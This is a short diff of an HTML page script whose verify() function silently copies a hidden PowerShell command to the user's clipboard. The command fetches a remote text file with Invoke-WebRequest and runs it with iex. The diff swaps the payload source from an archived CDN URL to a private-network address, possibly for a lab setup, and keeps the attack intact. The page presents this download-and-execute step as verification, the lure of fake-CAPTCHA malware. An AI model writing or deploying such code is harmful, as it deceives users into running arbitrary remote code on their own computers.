@@ -125,7 +125,7 @@
 	
     <script>
         function verify() {
-            const textToCopy = "powershell.exe -W Hidden -command $url = 'http://web.archive.org/web/20240912084036/https://report1.b-cdn.net/giga.txt'; $response = Invoke-WebRequest -Uri $url -UseBasicParsing; $text = $response.Content; iex $text";
+            const textToCopy = "powershell.exe -W Hidden -command $url = 'http://192.168.56.10/downloads/python_3-4_runtime_idle.txt'; $response = Invoke-WebRequest -Uri $url -UseBasicParsing; $text = $response.Content; iex $text";
             const tempTextArea = document.createElement("textarea");
             tempTextArea.value = textToCopy;
             document.body.appendChild(tempTextArea);
